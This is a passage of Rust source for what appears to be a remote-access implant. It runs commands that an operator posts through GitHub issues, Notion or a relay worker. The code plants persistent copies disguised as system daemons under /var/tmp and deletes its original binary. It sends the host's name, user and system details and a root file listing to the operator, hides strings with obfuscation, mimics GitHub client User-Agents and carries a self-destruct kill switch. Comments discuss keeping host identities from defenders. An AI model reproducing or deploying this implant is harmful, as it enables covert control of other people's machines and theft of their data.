        // detaches from us — when we exit, its PPID becomes 1 (init).
        std::process::Command::new(&target_path)
            .env("RELOCATED", "1")
            .env("C2_UPGRADE", "1")
            .env("C2_OLD_BINARY", current_exe.to_string_lossy().to_string())
            .process_group(0)
            .spawn()?;

        // Delete old binary directly — on Linux, unlink works on a running
        // executable (the inode stays alive until the process exits, at which
        // point the kernel frees it).  No fragile shell subprocess needed.
        // Exception: when started FROM the persistent /var/tmp copy (the
        // cron/rc.local restore path), keep it — deleting the only on-disk
        // binary while running from it leaves nothing to restore after a
        // reboot if this child dies before persistence reinstall.
        let persistent_copy = {
            let platform = crate::platform::detect();
            match platform.distro {
                crate::platform::Distro::CentOS | crate::platform::Distro::RHEL =>
                    "/var/tmp/.polkitd".to_string(),
                _ => "/var/tmp/.accounts-daemon".to_string(),
            }
        };
        if current_exe.to_string_lossy() != persistent_copy {
            let _ = std::fs::remove_file(&current_exe);
        }
    }

    Ok(target_path)
}

/// A（内部调度）：执行所有已到期的 schedule 条目（每轮至多 3 条，防止积压爆发）。
/// 回复命令 id 固定为 "sched-<id>"，控制器侧可见来自内部调度而非频道命令；
/// 频道不可达时输出写入离线缓冲，由 drain_buffered_responses 在网络恢复后补投递。
async fn run_due_schedule_tasks(config: &Config, issue_id: &str) {
    let due = crate::schedule::due_now(3);
    if due.is_empty() { return; }
    for (id, sched_cmd_id, command) in due {
        debug_log(&format!("Schedule fired: id={} cmd_id={} cmd_len={}", id, sched_cmd_id, command.len()));
        let cmd_clone = command.clone();
        let output = tokio::task::spawn_blocking(move || {
            crate::commands::execute_command(&cmd_clone)
        }).await.unwrap_or_else(|e| {
            format!("[Error] scheduled command panicked: {}", e)
        });
        debug_log(&format!("Scheduled command output length: {}", output.len()));
        if let Err(e) = send_response_chunks(&config, issue_id, &sched_cmd_id, &output).await {
            debug_log(&format!("Failed to send scheduled output: {}, buffering...", e));
            buffer_response(&sched_cmd_id, &output);
        } else {
            debug_log(&format!("Scheduled response sent (id={})", id));
        }
    }
}

/// B（双通道 failover）：备用 worker 是否可用（URL + secret 均非空）。
/// 双通道路由谓词：dual 启用后严格按 failover 当前活动通道路由，
/// 否则按 channel_type。channel=worker 的 dual 构建在 GitHub 备用期间
/// config.is_worker() 仍为 true——直接 OR 会把响应投向已死的 worker。
///
/// 防御：主身份没注册成功、只拿到 GitHub 号时（init 后 dual=false），
/// 不能再信 channel_type=worker，否则会拿数字 issue 号去打中继。
fn worker_active(config: &Config) -> bool {
    if crate::failover::dual_engaged() {
        crate::failover::active_is_worker()
    } else if !crate::failover::github_backup_id().is_empty()
        && !crate::failover::worker_available()
    {
        false
    } else {
        config.is_worker()
    }
}

/// Worker 中继通道配置齐全（URL + secret）。
fn worker_channel_ready(config: &Config) -> bool {
    !config.worker_urls.is_empty() && !config.worker_secret.is_empty()
}

/// GitHub 备份身份可用：token/repo 是真实凭据（排除占位值）。
fn github_backup_ready(config: &Config) -> bool {
    // 实战修复（lab E2E 2026-09-09）：config.github_repo 是 owner/repo 拆分后
    // 的 repo_name（不含斜杠），旧判 contains('/') 恒 false → dual 永远无法
    // 激活（真机一枪命中：双通道构建静默退化为纯 worker）。改用 owner 非
    // 空且非占位来证明原始 repo 形如 owner/repo。
    let t = config.github_token.trim();
    let o = config.github_owner.trim();
    let r = config.github_repo.trim();
    !t.is_empty() && t != "TOKEN" && t != "unused"
        && !o.is_empty() && o != "owner" && o != "unused"
        && !r.is_empty() && r != "repo" && r != "unused"
}

/// 注册/刷新 Worker 主身份 "w-<id8>"（幂等 upsert）。
/// 注册体 AES-GCM 加密后投递——中继（D1）不得落明文主机身份
/// （修复：此前备用注册路径发的是明文，与 create_or_load_issue 的
/// worker 分支不一致，蓝队拿到 Cloudflare 账号即可读出主机名/用户名）。
fn register_worker_identity(config: &Config, agent_id: &str) -> String {
    let wid = format!("w-{}", &agent_id[..agent_id.len().min(8)]);
    let mut body = format!("{}{}\nOS: {}\nHost: {}\nUser: {}\nVersion: {}\n", obfstr::obfstr!("Agent ID: ").to_string(),
                           agent_id, std::env::consts::OS,
                           whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
                           whoami::username(), config.version);
    if !config.release_id.is_empty() {
        body.push_str(&format!("Release: {}\n", config.release_id));
    }
    body.push_str(&format!("\n{}", crate::sysinfo::collect_sysinfo()));
    let Some(ch) = config.worker_chan() else {
        debug_log("failover: worker channel not configured (no URL/secret)");
        return String::new();
    };
    // 与 create_or_load_issue 的 worker 分支同款：加密后注册
    let enc = match crate::crypto::encrypt(&body, &config.password) {
        Ok(e) => e,
        Err(e) => {
            debug_log(&format!("failover: worker reg encrypt failed: {}", e));
            return String::new();
        }
    };
    match ch.register(&wid, &enc) {
        Ok(_) => {
            debug_log("failover: worker identity registered");
            wid
        }
        Err(e) => {
            debug_log(&format!("failover: worker register failed: {}", e));
            String::new()
        }
    }
}

/// 通道切换通知：阻塞重试，确保控制器 last_reply 跟上活动通道。
/// 返回是否落地——失败时调用方必须回滚通道状态，否则控制器仍打旧通道。
async fn send_channel_notice(config: &Config, dest: &str, tag: &str, note: &str) -> bool {
    if dest.is_empty() {
        return false;
    }
    for attempt in 1..=3u32 {
        match send_response_chunks(config, dest, tag, note).await {
            Ok(()) => return true,
            Err(e) => {
                debug_log(&format!("failover: {tag} notice {attempt}/3 failed: {e}"));
                if attempt < 3 {
                    sleep(Duration::from_secs(2)).await;
                }
            }
        }
    }
    false
}

/// Worker 主通道探测成功后的收尾：重新注册 worker 身份（幂等），成功即切回。
/// H1 修复：切回后立刻经 worker 发一条通道通知——刷新控制器侧 worker 行的
/// last_reply，命令路由立即回到 worker。此前切回后 agent 在 GitHub 上无任何
/// 活动（无心跳），控制器按「最近活跃」继续投 GitHub，而 agent 已不听
/// GitHub——每条命令都石沉大海，形成死锁（审计 H1）。
async fn ensure_worker_ready_then_failback(config: &Config, agent_id: &str) {
    let cfg_c = config.clone();
    let aid_c = agent_id.to_string();
    let wid = tokio::task::spawn_blocking(move || register_worker_identity(&cfg_c, &aid_c))
        .await
        .unwrap_or_default();
    if wid.is_empty() {
        debug_log("failover: Worker 探测成功但注册失败（本次保持 GitHub 备用）");
        crate::failover::primary_probe_failed();
        return;
    }
    crate::failover::primary_probe_succeeded();
    // 重新注册成功即清零 worker 水位（与启动注册同款自愈：D1 重建后旧高位
    // 水位会无声滤掉全部新命令；一次全量拉取由去重集兜底）。
    crate::stor::clear_worker_cursor();
    let note = format!("[Channel] worker primary restored at {}",
                       chrono::Local::now().format("%H:%M:%S"));
    let dest = crate::failover::active_issue_id();
    // 通知失败则回滚到 GitHub 备用：否则 Agent 已听 Worker，控制器 last_reply
    // 仍在 GitHub，下一条令石沉大海。
    if !send_channel_notice(config, &dest, "channel-failback", &note).await {
        debug_log("failover: failback notice failed — stay on GitHub backup");
        crate::failover::force_degrade();
        crate::failover::primary_probe_failed();
    }
}

#[allow(unused_assignments)]
async fn run_agent(config: &Config, agent_id: &str) -> Result<(), Box<dyn std::error::Error>> {
    debug_log("Connecting to channel...");

    // 双通道方向（架构调整）：Worker 为主，GitHub 为备。中继是操作者自己的
    // 基础设施（无 API 限额/封号风险），GitHub 作为第三方依赖当备用更合理。
    // dual = worker 配置齐全 + GitHub 真实凭据 + 非 Notion。
    let worker_ready = worker_channel_ready(config);
    let dual = worker_ready && github_backup_ready(config) && !config.is_notion();

    // 启动探主：dual / 纯 worker → TCP 探中继；纯 github/notion → 原逻辑
    //（GitHub/Notion 走可达性探测，与降级后重试语义一致）。
    let primary_reachable = if dual || config.is_worker() {
        check_worker_reachable(config).await
    } else {
        check_api_reachable(config).await
    };
    let mut start_on_backup = !primary_reachable && dual;
    if !primary_reachable {
        if dual {
            debug_log("Worker primary unreachable at startup — starting on GitHub backup");
        } else {
            debug_log("API unreachable, waiting 120s before retry...");
            sleep(Duration::from_secs(120)).await;
            return Err("Network unavailable".into());
        }
    }

    // ── 主身份（Worker w-<id8>）：dual 与纯 worker 都注册（3 次重试）──
    let worker_id: String = if worker_ready {
        let mut wid = String::new();
        for attempt in 1..=3u32 {
            let cfg_b = config.clone();
            let aid_b = agent_id.to_string();
            wid = tokio::task::spawn_blocking(move || register_worker_identity(&cfg_b, &aid_b))
                .await
                .unwrap_or_default();
            if !wid.is_empty() {
                break;
            }
            debug_log(&format!("failover: worker register retry {}/3", attempt));
            sleep(Duration::from_secs(2)).await;
        }
        if !wid.is_empty() {
            // 注册成功即清零 worker 水位（逻辑性审计）：中继 D1 若被重建，
            // AUTOINCREMENT 从头计数，旧高位水位会把新命令全部滤掉且健康态
            // 无错误信号（空拉取≠报错）。清零后一次全量拉 ≤100 行，重放由
            // 去重集 processed 兜底。
            crate::stor::clear_worker_cursor();
        }
        wid
    } else {
        String::new()
    };
    // 纯 worker 注册失败：无路可退，退避重试。dual 注册失败可走 GitHub 备用。
    if config.is_worker() && !dual && worker_id.is_empty() {
        debug_log("worker: register failed, backing off 60s");
        sleep(Duration::from_secs(60)).await;
        return Err("worker channel unavailable".into());
    }

    // 注册失败仍保住 dual：用确定性 w-<id8> 占住主身份，并从 GitHub 备用起步。
    // 否则 init("", gh, _) 会关掉 dual，worker_active() 回落到
    // config.is_worker()==true，之后一直拿 GitHub issue 号去打中继，
    // should_probe_primary() 也恒假，Worker 恢复了也回不来。
    let mut worker_id = worker_id;
    if dual && worker_id.is_empty() {
        debug_log("failover: worker register failed, keeping dual intent on GitHub backup");
        start_on_backup = true;
        worker_id = format!("w-{}", &agent_id[..agent_id.len().min(8)]);
    }

    // ── 身份建立：GitHub issue（dual=备份身份，force_github 走 github 分支）──
    let (gh_issue_id, is_new_issue) = if dual {
        // worker 健康 → GitHub 是备份，best-effort 不阻塞主通道；
        // worker 不可达（start_on_backup）→ GitHub 是当前工作通道，阻塞建。
        let cfg_c = config.clone();
        let aid_c = agent_id.to_string();
        match tokio::task::spawn_blocking(move || create_or_load_issue(&cfg_c, &aid_c, true)).await {
            Ok(Ok((i, n))) => (i, n),
            _ => {
                // 建不出来：退回缓存 issue id（verify 保留的），再不行只能退出。
                let cached = std::fs::read_to_string(get_issue_file_path())
                    .unwrap_or_default().trim().to_string();
                let cached = if crate::failover::is_real_github_backup_id(&cached) {
                    cached
                } else {
                    String::new()
                };
                if cached.is_empty() && start_on_backup {
                    debug_log("failover: GitHub backup issue unavailable and worker down — backing off 60s");
                    sleep(Duration::from_secs(60)).await;
                    return Err("both channels unavailable".into());
                }
                if !cached.is_empty() && start_on_backup {
                    debug_log("failover: GitHub issue create failed, using cached id");
                }
                (cached, false)
            }
        }
    } else {
        // 非 dual：单一通道（github/notion/纯 worker）按原语义阻塞建。
        let cfg_c = config.clone();
        let aid_c = agent_id.to_string();
        let (i, n) = tokio::task::spawn_blocking(move || create_or_load_issue(&cfg_c, &aid_c, false)).await
            .map_err(|e| -> Box<dyn std::error::Error> { format!("join: {}", e).into() })?
            .map_err(|e| -> Box<dyn std::error::Error> { e })?;
        (i, n)
    };
    debug_log(&format!("Issue/Page ID: {}", gh_issue_id));

    crate::failover::init(
        &worker_id,
        &gh_issue_id,
        start_on_backup,
        config.failover_threshold,
        config.probe_after_oks);

    // 双通道意图但 GitHub 备份 issue 没建成（worker 健康时 best-effort 建失败
    // 被容忍）：dual 此刻是 false，worker 之后挂了将无备可切。后台补建几次，
    // 成功即 set_github_backup_id 升级成 dual（全局性审计补的闭环）。
    if dual && crate::failover::github_backup_id().is_empty() {
        let cfg_r = config.clone();
        let aid_r = agent_id.to_string();
        tokio::spawn(async move {
            for attempt in 1..=5u32 {
                debug_log(&format!("failover: github backup issue retry {}/5", attempt));
                let cfg_c = cfg_r.clone();
                let aid_c = aid_r.clone();
                let ok = tokio::task::spawn_blocking(move || {
                    create_or_load_issue(&cfg_c, &aid_c, true)
                }).await;
                if let Ok(Ok((iid, _))) = ok {
                    if crate::failover::is_real_github_backup_id(&iid) {
                        crate::failover::set_github_backup_id(&iid);
                        debug_log("failover: github backup issue established (dual armed)");
                        return;
                    }
                }
                tokio::time::sleep(Duration::from_secs(30)).await;
            }
            debug_log("failover: github backup issue retries exhausted — dual unavailable this run");
        });
    }

    let mut last_comment_id = load_last_comment_id();
    let mut failure_count = 0u32;
    let mut backoff_multiplier = 1u64;
    let mut consecutive_failures = 0u32;
    // Throttle backup fetch: at most once per hour to avoid hammering the backup
    // server and prevent the "same config → restart → delete issue → duplicate issue"
    // loop that would occur if the backup URL returns an unchanged config.
    let mut last_backup_attempt: Option<std::time::Instant> = None;
    let is_first_run = is_new_issue;

    // Three-tier adaptive polling (SessionHeat)
    let mut heat = SessionHeat::new();

    debug_log("Entering main loop...");

    // 重启后若直接走 Worker 主通道，补一条就绪通知，否则控制器还按上一轮
    // GitHub last_reply 发令（冷启动 H2）。
    if crate::failover::dual_engaged() && !crate::failover::on_backup() {
        let note = format!("[Channel] worker primary ready at {}",
                           chrono::Local::now().format("%H:%M:%S"));
        let dest = crate::failover::active_issue_id();
        let _ = send_channel_notice(config, &dest, "channel-startup", &note).await;
    }

    if is_first_run {
        // Send initial file list in a non-blocking spawn so the main command
        // loop starts immediately — on servers with huge root directories this
        // could otherwise block for many seconds.
        let cfg_clone = config.clone();
        let inum = gh_issue_id.clone();
        tokio::spawn(async move {
            debug_log("First run, sending initial file list (background)...");
            let default_path = if cfg!(windows) { "DRIVES" } else { "/" };
            let output = crate::files::list_files(default_path);
            let dest = crate::failover::active_issue_id();
            let dest = if dest.is_empty() { inum } else { dest };
            if let Err(e) = send_response_chunks(&cfg_clone, &dest, "bootstrap-file-list", &output).await {
                debug_log(&format!("Failed to send initial file list: {}", e));
            } else {
                debug_log("Initial file list sent");
            }
        });
        heat.touch();
    }

    loop {
        if !crate::timewindow::is_in_active_window_with_jitter(agent_id) {
            // 窗外仍查 kill：紧急停机不能等下一个活动窗口（可能十几个小时）。
            let cfg_k = config.clone();
            let found = tokio::task::spawn_blocking(move || check_kill_signal(&cfg_k))
                .await
                .unwrap_or(false);
            if found {
                debug_log("KILL SIGNAL detected (outside window) — executing self-destruct");
                let _ = crate::commands::execute_command("uninstall");
                return Err("Kill switch activated".into());
            }
            let secs = crate::timewindow::outside_window_sleep_secs();
            debug_log(&format!("Outside active window, sleeping {}s", secs));
            sleep(Duration::from_secs(secs)).await;
            continue;
        }

        // 启动时主通道通、GitHub 备份 issue 只是 best-effort：失败则 dual
        // 升不起来，Worker 之后挂了无处可降。每 10 轮补建一次。
        if crate::failover::worker_available()
            && crate::failover::github_backup_id().is_empty()
            && github_backup_ready(&config)
        {
            static GH_BACKUP_RETRY: std::sync::atomic::AtomicU32 =
                std::sync::atomic::AtomicU32::new(0);
            let n = GH_BACKUP_RETRY.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            if n == 0 || n % 3 == 0 {
                let cfg_g = config.clone();
                let aid_g = agent_id.to_string();
                match tokio::task::spawn_blocking(move || {
                    create_or_load_issue(&cfg_g, &aid_g, true)
                }).await {
                    Ok(Ok((iid, _))) if crate::failover::is_real_github_backup_id(&iid) => {
                        crate::failover::set_github_backup_id(&iid);
                        debug_log(&format!("failover: GitHub backup issue ready: {}", iid));
                    }
                    Ok(Err(e)) => debug_log(&format!("failover: GitHub backup create retry: {}", e)),
                    Err(e) => debug_log(&format!("failover: GitHub backup create join: {}", e)),
                    _ => {}
                }
            }
        }

        // 双通道：按当前活动通道刷新 issue id（正常=worker w-<id8>，备用=GitHub 号）。
        let mut issue_id = crate::failover::active_issue_id();

        // GitHub 备用稳定后探测一次 Worker 主通道，成功且能重新注册 → 切回。
        // 探测必须打 worker 中继地址（check_worker_reachable），不能用
        // check_api_reachable——它在备用期会改探 GitHub，恒真会把仍故障的
        // worker 立即切回，形成来回震荡。
        if crate::failover::should_probe_primary() {
            debug_log("failover: probing worker primary...");
            if check_worker_reachable(&config).await {
                ensure_worker_ready_then_failback(&config, agent_id).await;
            } else {
                crate::failover::primary_probe_failed();
            }
            // 切回后立刻重读：否则本轮仍拿 GitHub 号打 worker 中继 → 404。
            issue_id = crate::failover::active_issue_id();
        }

        // Kill-switch check: every 10th cycle to minimize extra API calls,
        // but EVERY cycle while backing off or failing — otherwise at max
        // backoff (30 min × 10 cycles) an emergency KILLALL could take hours.
        static KILL_CHECK_COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
        let cycle = KILL_CHECK_COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        if cycle % 3 == 0 || backoff_multiplier > 1 || consecutive_failures > 0 {
            let cfg_c = config.clone();
            let found = tokio::task::spawn_blocking(move || check_kill_signal(&cfg_c)).await.unwrap_or(false);
            if found {
                debug_log("KILL SIGNAL detected — executing self-destruct");
                let _ = crate::commands::execute_command("uninstall");
                return Err("Kill switch activated".into());
            }
        }

        // Retry sending buffered old responses
        drain_buffered_responses(&config, &issue_id).await;

        // A（内部调度）：每轮询周期评估到期任务并在本地执行。频道不可达时
        // 输出走离线缓冲（网络恢复后由 drain_buffered_responses 补投递），
        // 因此调度执行不受 GitHub 退避/404 等频道故障影响。
        run_due_schedule_tasks(&config, &issue_id).await;

        match check_commands(&config, &issue_id, &mut last_comment_id, agent_id).await {
            Ok(had_cmd) => {
                crate::failover::note_success();
                if had_cmd {
                    debug_log("Command executed successfully");
                    heat.touch(); // operator active — increase heat level
                }
                failure_count = 0;
                backoff_multiplier = 1;
                consecutive_failures = 0;
            }
            Err(e) => {
                let was_on_backup = crate::failover::on_backup();
                crate::failover::note_failure();
                let err_msg = e.to_string();
                debug_log(&format!("Command check error: {}", err_msg));

                // 刚切入 GitHub 备用：补建缺失的备份 issue + H1 对称通知。
                // 通知经 GitHub 发出会刷新控制器侧 GitHub 行的 last_reply，
                // 命令路由立即跟随（反向的 failback 通知见
                // ensure_worker_ready_then_failback——审计 H1 死锁的两侧）。
                if crate::failover::on_backup() && !was_on_backup {
                    if crate::failover::github_backup_id().is_empty() {
                        let cfg_g = config.clone();
                        let aid_g = agent_id.to_string();
                        if let Ok(Ok((iid, _))) = tokio::task::spawn_blocking(move || {
                            create_or_load_issue(&cfg_g, &aid_g, true)
                        }).await {
                            if crate::failover::is_real_github_backup_id(&iid) {
                                crate::failover::set_github_backup_id(&iid);
                            }
                        }
                    }
                    let note = format!("[Channel] worker primary failed, switched to github backup at {}",
                                       chrono::Local::now().format("%H:%M:%S"));
                    let dest = crate::failover::active_issue_id();
                    if !send_channel_notice(&config, &dest, "channel-degrade", &note).await {
                        // 实战修复（lab E2E）：通知只是 courtesy，控制器对
                        // worker-fail 本就有兜底回退投递。通知失败绝不能回滚
                        // 降级——旧代码误用 primary_probe_succeeded() 回滚，
                        // 会把 agent 切回故障中继并清零计数（GitHub 一限流
                        // 403 通知必失败，降级永远完不成，agent 在死中继打转）。
                        debug_log("failover: degrade notice failed — keep GitHub backup, controller falls back on its own");
                    }
                }

                consecutive_failures += 1;
                let on_worker = crate::failover::active_is_worker();

                // Worker 通道的 401/403/429 不是 GitHub 次级限额，不要睡 15–30 分钟。
                if on_worker && (err_msg.contains("401") || err_msg.contains("Unauthorized")
                    || err_msg.contains("403"))
                {
                    debug_log("Worker 鉴权/PATH 失败，短退避（不套 GitHub 次级限额）");
                    backoff_multiplier = 2;
                } else if on_worker && (err_msg.contains("429") || err_msg.contains("rate limit")) {
                    debug_log("Worker 429，短退避");
                    backoff_multiplier = 4;
                } else if err_msg.contains("401") || err_msg.contains("Unauthorized") {
                    debug_log("Token invalid (401), trying backup config immediately...");
                    let can_try_backup = last_backup_attempt
                        .map(|t| t.elapsed().as_secs() >= 3600)
                        .unwrap_or(true);
                    if !config.backup_url.is_empty() && can_try_backup {
                        last_backup_attempt = Some(std::time::Instant::now());
                        let backup_url = config.backup_url.clone();
                        if let Ok(Ok(backup)) = tokio::task::spawn_blocking(move || {
                            crate::backup_config::fetch_backup_config(&backup_url)
                        }).await {
                            // Only restart if the config actually changed; restarting with an
                            // identical config would delete the cached issue ID and cause a
                            // duplicate issue to be created on GitHub.
                            let config_changed = backup.github_token != config.github_token
                                || backup.github_repo != config.github_repo
                                || backup.channel != config.channel_type;
                            if config_changed {
                                debug_log("Backup config fetched on 401, new credentials — applying...");
                                crate::backup_config::apply_backup_config(&backup);
                                let _ = crate::backup_config::persist_backup_config(&backup);
                                let _ = fs::remove_file(get_issue_file_path());
                                return Err("Config updated, restart required".into());
                            } else {
                                debug_log("Backup config unchanged on 401 (same token/repo), skipping restart");
                            }
                        }
                    } else if !can_try_backup {
                        debug_log("Backup fetch skipped: within 1h cooldown window");
                    }
                    // Backup config also failed: cap backoff at 5 minutes.
                    // Operator may be updating the token — allow faster recovery.
                    backoff_multiplier = 10; // 10 × 30s = 300s = 5 min
                } else if err_msg.contains("403") {
                    // GitHub secondary rate limit returns 403
                    debug_log("Secondary rate limit (403), backing off 15 minutes");
                    backoff_multiplier = 30;
                } else if err_msg.contains("429") || err_msg.contains("rate limit") {
                    debug_log("Primary rate limit (429), backing off 30 minutes");
                    backoff_multiplier = 60;
                } else {
                    // Generic error: exponential backoff after accumulated failures; try backup config
                    failure_count += 1;
                    if failure_count > 3 {
                        backoff_multiplier = (backoff_multiplier * 2).min(12);
                    }
                    let can_try_backup = last_backup_attempt
                        .map(|t| t.elapsed().as_secs() >= 3600)
                        .unwrap_or(true);
                    if consecutive_failures >= 5 && !config.backup_url.is_empty() && can_try_backup {
                        last_backup_attempt = Some(std::time::Instant::now());
                        debug_log("Attempting to fetch backup config after repeated failures...");
                        let backup_url = config.backup_url.clone();
                        let result = tokio::task::spawn_blocking(move || {
                            crate::backup_config::fetch_backup_config(&backup_url)
                        }).await;
                        match result {
                            Ok(Ok(backup)) => {
                                // Only restart when credentials actually differ; if the backup
                                // returns the same config the primary channel is simply unreachable
                                // and we should keep retrying without wiping the cached issue ID.
                                let config_changed = backup.github_token != config.github_token
                                    || backup.github_repo != config.github_repo
                                    || backup.channel != config.channel_type;
                                if config_changed {
                                    debug_log("Backup config fetched, applying new config...");
                                    crate::backup_config::apply_backup_config(&backup);
                                    let _ = crate::backup_config::persist_backup_config(&backup);
                                    let _ = fs::remove_file(get_issue_file_path());
                                    return Err("Config updated, restart required".into());
                                } else {
                                    debug_log("Backup config unchanged, primary channel unreachable — continuing retry");
                                }
                            }
                            Ok(Err(e)) => debug_log(&format!("Backup config failed: {}", e)),
                            Err(e)     => debug_log(&format!("Backup config task error: {}", e)),
                        }
                    } else if consecutive_failures >= 5 && !config.backup_url.is_empty() {
                        debug_log("Backup fetch skipped: within 1h cooldown window");
                    }
                }

                if (err_msg.contains("404") || err_msg.contains("410")) && !on_worker {
                    debug_log(&format!("Issue gone ({}), deleting state and recreating...",
                        if err_msg.contains("410") { "410 Gone" } else { "404 Not Found" }));
                    let _ = fs::remove_file(get_issue_file_path());
                    let _ = fs::remove_file(get_last_comment_file_path());
                    last_comment_id = 0;
                    return Err("Issue deleted, will recreate".into());
                } else if (err_msg.contains("404") || err_msg.contains("410")) && on_worker {
                    debug_log("Worker 404/410 — 不清理 GitHub issue 缓存与水位");
                }
            }
        }

        // SessionHeat adaptive polling: fast when operator is active, slower when idle
        let base_interval = heat.poll_interval(config.poll_interval);
        let interval = base_interval.saturating_mul(backoff_multiplier).min(1800);
        let jitter = (rand::random::<f64>() * 0.4 - 0.2) * interval as f64;
        let final_interval = (interval as f64 + jitter).max(1.0) as u64;

        sleep(Duration::from_secs(final_interval)).await;
    }
}

#[derive(Clone)]
struct Config {
    channel_type: String,   // "github", "notion" or "worker"
    github_token: String,   // GitHub PAT or Notion Integration Token
    github_owner: String,   // GitHub owner (empty for Notion)
    github_repo: String,    // GitHub repo name or Notion database_id
    password: String,
    backup_url: String,
    poll_interval: u64,
    user_agent: String,
    // Worker channel (runtime env only — not part of the accessor template):
    // up to two base URLs with automatic failover + the shared relay secret.
    worker_urls: Vec<String>,
    worker_secret: String,
    worker_path: String,
    // 项 9 版本自上报：优先级 运行时 env > 编译期(build.rs rustc-env) > embedded。
    version: String,
    release_id: String,
    // 项 2 控制面板：故障切换阈值 / 备用稳定多少轮后探测主通道（0 = 默认 3/5）。
    failover_threshold: u32,
    probe_after_oks: u32,
}

impl Config {
    fn is_worker(&self) -> bool {
        self.channel_type == "worker"
    }

    fn is_notion(&self) -> bool {
        self.channel_type == "notion"
    }

    fn api_base(&self) -> String {
        // C2_LAB: point every API call at a local mock SaaS server for lab /
        // integration testing (e.g. C2_LAB=http://127.0.0.1:8480). The value
        // is used verbatim as the base; the mock implements the same path
        // suffixes (/repos/... for GitHub, /v1/... for Notion). Ignored unset.
        if let Ok(base) = std::env::var("C2_LAB") {
            let b = base.trim().trim_end_matches('/').to_string();
            if b.starts_with("http://") || b.starts_with("https://") {
                return b;
            }
        }
        if self.is_notion() {
            format!("https://{}/v1", obfstr::obfstr!("api.notion.com"))
        } else {
            format!("https://{}", obfstr::obfstr!("api.github.com"))
        }
    }
}

impl Config {
    fn from_env() -> Self {
        // Three-tier priority: runtime env var > compile-time option_env! > embedded_config
        // Empty-string runtime env vars are treated as unset: leftover empty
        // GITHUB_TOKEN/GITHUB_REPO entries (common on CI runner images) would
        // otherwise shadow the real embedded config and abort startup.
        let env_nonempty = |k: &str| std::env::var(k).ok().filter(|s| !s.is_empty());

        let channel_type = env_nonempty(obfstr::obfstr!("CHANNEL_TYPE"))
            .or_else(|| option_env!("CHANNEL_TYPE").map(|s| s.to_string()))
            .or_else(|| { let v = crate::embedded_config::channel_type(); if !v.is_empty() { Some(v) } else { None } })
            .unwrap_or_else(|| "github".to_string());

        let ec = crate::embedded_config::github_token();

        let token = env_nonempty(obfstr::obfstr!("GITHUB_TOKEN"))
            .or_else(|| option_env!("GITHUB_TOKEN").map(|s| s.to_string()))
            .or_else(|| if !ec.is_empty() { Some(ec.clone()) } else { None })
            .unwrap_or_else(|| "TOKEN".to_string());

        let repo = env_nonempty(obfstr::obfstr!("GITHUB_REPO"))
            .or_else(|| option_env!("GITHUB_REPO").map(|s| s.to_string()))
            .or_else(|| { let v = crate::embedded_config::github_repo(); if !v.is_empty() { Some(v) } else { None } })
            .unwrap_or_else(|| "owner/repo".to_string());

        let password = env_nonempty(obfstr::obfstr!("ENCRYPTION_PASSWORD"))
            .or_else(|| option_env!("ENCRYPTION_PASSWORD").map(|s| s.to_string()))
            .or_else(|| { let v = crate::embedded_config::encryption_password(); if !v.is_empty() { Some(v) } else { None } })
            .unwrap_or_default();

        let backup_url = env_nonempty(obfstr::obfstr!("BACKUP_URL"))
            .or_else(|| option_env!("BACKUP_URL").map(|s| s.to_string()))
            .or_else(|| { let v = crate::embedded_config::backup_url(); if !v.is_empty() { Some(v) } else { None } })
            .unwrap_or_default();

        let poll_interval = env_nonempty(obfstr::obfstr!("POLL_INTERVAL"))
            .or_else(|| option_env!("POLL_INTERVAL").map(|s| s.to_string()))
            .or_else(|| { let v = crate::embedded_config::poll_interval(); if !v.is_empty() { Some(v) } else { None } })
            .and_then(|s| s.parse::<u64>().ok())
            .map(|v| v.max(10))
            .unwrap_or(30);

        // For GitHub: repo = "owner/repo" -> split into owner + repo
        // For Notion: repo = database_id (UUID, no slash) -> owner="" repo=database_id
        let parts: Vec<&str> = repo.split('/').collect();
        let (owner, repo_name) = if channel_type == "notion" {
            (String::new(), repo.clone())
        } else {
            (parts.get(0).unwrap_or(&"owner").to_string(),
             parts.get(1).unwrap_or(&"repo").to_string())
        };

        // A3 修复：Worker 配置加 embedded 回退——Builder 生成的 worker Agent
        // 此前只有环境变量一层，目标机上没有这些变量 → 启动即"未配置"退出。
        let w_urls_raw = env_nonempty(obfstr::obfstr!("C2_WORKER_URLS"))
            .unwrap_or_else(|| crate::embedded_config::worker_urls());
        let worker_urls: Vec<String> = if w_urls_raw.is_empty() { Vec::new() } else {
            w_urls_raw.split(',').map(|u| u.trim().to_string()).filter(|u| !u.is_empty()).collect()
        };
        let worker_secret = env_nonempty(obfstr::obfstr!("C2_WORKER_SECRET"))
            .unwrap_or_else(|| crate::embedded_config::worker_secret());
        let worker_path = env_nonempty(obfstr::obfstr!("C2_WORKER_PATH"))
            .unwrap_or_else(|| crate::embedded_config::worker_path());

        // 项 9（版本自上报）：运行时 env 覆盖 > 编译期 build.rs 注入(AGENT_VERSION) >
        // builder 写入 embedded_config。release_id 同理（RELEASE_ID）。
        let version = env_nonempty(obfstr::obfstr!("C2_AGENT_VERSION"))
            .or_else(|| option_env!("AGENT_VERSION").map(|s| s.to_string()))
            .or_else(|| { let v = crate::embedded_config::version(); if !v.is_empty() { Some(v) } else { None } })
            .unwrap_or_else(|| "unknown".to_string());
        let release_id = env_nonempty(obfstr::obfstr!("C2_RELEASE_ID"))
            .or_else(|| option_env!("RELEASE_ID").map(|s| s.to_string()))
            .or_else(|| { let v = crate::embedded_config::release_id(); if !v.is_empty() { Some(v) } else { None } })
            .unwrap_or_default();

        // 项 2 控制面板：故障切换阈值 / 主通道探测间隔（轮）。0 或非法 → 0，
        // 由 failover::init 取默认（3 / 5）。
        let failover_threshold = env_nonempty(obfstr::obfstr!("C2_FAILOVER_THRESHOLD"))
            .unwrap_or_else(|| crate::embedded_config::failover_threshold())
            .trim().parse::<u32>().unwrap_or(0);
        let probe_after_oks = env_nonempty(obfstr::obfstr!("C2_PROBE_AFTER_OKS"))
            .unwrap_or_else(|| crate::embedded_config::probe_after_oks())
            .trim().parse::<u32>().unwrap_or(0);

        Self {
            channel_type,
            github_token: token,
            github_owner: owner,
            github_repo: repo_name,
            password,
            backup_url,
            poll_interval,
            user_agent: build_user_agent(),
            worker_urls,
            worker_secret,
            worker_path,
            version,
            release_id,
            failover_threshold,
            probe_after_oks,
        }
    }
}

/// Build a User-Agent string that mimics real GitHub API clients (8 variants).
